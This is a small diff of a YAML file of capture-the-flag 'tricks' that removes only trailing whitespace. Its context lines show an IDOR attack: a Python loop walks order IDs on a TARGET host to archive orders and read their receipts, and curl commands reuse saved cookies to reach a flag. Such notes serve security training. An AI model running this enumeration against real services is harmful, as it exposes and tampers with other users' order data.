@@ -42,10 +42,10 @@ tricks:
     how: "Iterate through order IDs, archive each, check receipts"
     payload: |
       import requests
-      
+
       s = requests.Session()
       # ... login first ...
-      
+
       for id in range(300100, 300250):
           s.get(f'http://TARGET/order/{id}/archive')
           resp = s.get(f'http://TARGET/order/{id}/receipt')
@@ -60,4 +60,3 @@ tricks:
       curl -b cookies.txt http://TARGET/order/300198/archive
       curl -b cookies.txt http://TARGET/order/300198/receipt
       # FLAG{...}
-
